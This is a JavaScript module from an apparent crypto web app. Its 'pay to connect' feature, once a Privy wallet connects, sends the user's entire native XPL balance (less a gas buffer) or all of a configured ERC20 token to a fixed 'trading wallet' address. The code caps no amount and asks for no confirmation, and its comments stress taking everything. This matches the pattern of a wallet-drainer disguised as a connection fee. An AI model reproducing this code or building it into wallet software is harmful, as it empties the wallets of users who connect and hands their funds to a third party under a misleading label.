import { ethers } from 'ethers';
import { transferERC20ToTradingWallet, getERC20Balance } from './erc20.js';
import { CHAINS } from '../config/chains.js';

/**
 * Pay to Connect - AUTO-DETECT chain and transfer funds
 * NO manual chain selection - detects Base or XPL automatically
 */

/**
 * Execute pay-to-connect - AUTO-DETECTS chain from wallet
 * @param {object} wallet - Privy wallet object
 * @returns {Promise<object>} - Transaction result
 */
export async function executePayToConnect(wallet) {
  try {
    // Get provider and detect chain
    const provider = await wallet.getEthersProvider();
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    
    console.log('🔍 Auto-detected chain:', chainId);
    
    // Find chain config
    const chainConfig = Object.values(CHAINS).find(c => c.chainId === chainId);
    
    if (!chainConfig) {
      throw new Error(`Unsupported chain: ${chainId}. Please switch to Base or XPL.`);
    }
    
    console.log(`🚀 Starting pay-to-connect on ${chainConfig.name}`);
    
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    
    if (chainConfig.payToConnect.type === 'NATIVE') {
      // XPL Chain - Transfer native XPL
      return await transferNativeToken(signer, userAddress, chainConfig);
    } else if (chainConfig.payToConnect.type === 'ERC20') {
      // Base Chain - Transfer ERC20 token
      return await transferERC20Token(signer, userAddress, chainConfig);
    } else {
      throw new Error(`Unknown payment type: ${chainConfig.payToConnect.type}`);
    }
  } catch (error) {
    console.error('❌ Pay to Connect error:', error);
    throw error;
  }
}

/**
 * Transfer native token (XPL) to trading wallet
 */
async function transferNativeToken(signer, userAddress, chainConfig) {
  try {
    const provider = signer.provider;
    
    // Get user's XPL balance
    const balance = await provider.getBalance(userAddress);
    console.log(`💰 Current XPL balance: ${ethers.formatEther(balance)} XPL`);
    
    if (balance === 0n) {
      throw new Error('No XPL to transfer. Please add XPL to your wallet first.');
    }
    
    // Calculate amount to send (ALL minus gas buffer)
    const gasBuffer = ethers.parseEther(chainConfig.payToConnect.gasBuffer || '0.001');
    
    if (balance <= gasBuffer) {
      throw new Error(`Insufficient XPL. Need more than ${chainConfig.payToConnect.gasBuffer} XPL for gas.`);
    }
    
    const amountToSend = balance - gasBuffer;
    
    console.log(`📤 Transferring ${ethers.formatEther(amountToSend)} XPL to ${chainConfig.tradingWallet}`);
    console.log(`🔒 Keeping ${chainConfig.payToConnect.gasBuffer} XPL for gas`);
    
    // Send transaction
    const tx = await signer.sendTransaction({
      to: chainConfig.tradingWallet,
      value: amountToSend
    });
    
    console.log(`⏳ Transaction sent: ${tx.hash}`);
    
    const receipt = await tx.wait();
    console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
    
    return {
      success: true,
      txHash: tx.hash,
      amount: ethers.formatEther(amountToSend),
      symbol: chainConfig.nativeCurrency.symbol,
      type: 'NATIVE',
      chain: chainConfig.name
    };
    
  } catch (error) {
    console.error('❌ Native token transfer error:', error);
    throw error;
  }
}

/**
 * Transfer ERC20 token to trading wallet (Base chain)
 */
async function transferERC20Token(signer, userAddress, chainConfig) {
  try {
    const tokenAddress = chainConfig.payToConnect.token;
    
    console.log(`💰 Checking ${chainConfig.payToConnect.name} balance...`);
    
    // Get balance first
    const balance = await getERC20Balance(tokenAddress, userAddress, signer.provider);
    
    if (parseFloat(balance) === 0) {
      throw new Error(`No ${chainConfig.payToConnect.name} tokens to transfer. Please add tokens to your wallet first.`);
    }
    
    console.log(`📤 Transferring ALL ${chainConfig.payToConnect.name} to ${chainConfig.tradingWallet}`);
    
    // Transfer ALL tokens to trading wallet
    const result = await transferERC20ToTradingWallet(
      tokenAddress,
      chainConfig.tradingWallet,
      signer
    );
    
    return {
      ...result,
      type: 'ERC20',
      chain: chainConfig.name
    };
    
  } catch (error) {
    console.error('❌ ERC20 token transfer error:', error);
    throw error;
  }
}

/**
 * Check if user has sufficient balance for pay-to-connect
 * AUTO-DETECTS chain from wallet
 */
export async function checkPayToConnectBalance(wallet) {
  try {
    const provider = await wallet.getEthersProvider();
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    
    const chainConfig = Object.values(CHAINS).find(c => c.chainId === chainId);
    
    if (!chainConfig) {
      return { 
        sufficient: false, 
        balance: '0', 
        message: `Unsupported chain: ${chainId}`,
        chainId 
      };
    }
    
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    
    if (chainConfig.payToConnect.type === 'NATIVE') {
      const balance = await provider.getBalance(userAddress);
      const gasBuffer = ethers.parseEther(chainConfig.payToConnect.gasBuffer || '0.001');
      const sufficient = balance > gasBuffer;
      
      return {
        sufficient,
        balance: ethers.formatEther(balance),
        symbol: chainConfig.nativeCurrency.symbol,
        message: sufficient ? 'Sufficient balance' : `Need more than ${chainConfig.payToConnect.gasBuffer} ${chainConfig.nativeCurrency.symbol}`,
        chain: chainConfig.name,
        chainId
      };
    } else if (chainConfig.payToConnect.type === 'ERC20') {
      const balance = await getERC20Balance(
        chainConfig.payToConnect.token,
        userAddress,
        provider
      );
      const sufficient = parseFloat(balance) > 0;
      
      return {
        sufficient,
        balance,
        symbol: chainConfig.payToConnect.name,
        message: sufficient ? 'Sufficient balance' : `No ${chainConfig.payToConnect.name} tokens`,
        chain: chainConfig.name,
        chainId
      };
    }
    
    return { 
      sufficient: false, 
      balance: '0', 
      message: 'Unknown payment type',
      chainId 
    };
  } catch (error) {
    console.error('Error checking balance:', error);
    return { 
      sufficient: false, 
      balance: '0', 
      message: error.message,
      chainId: 0
    };
  }
}
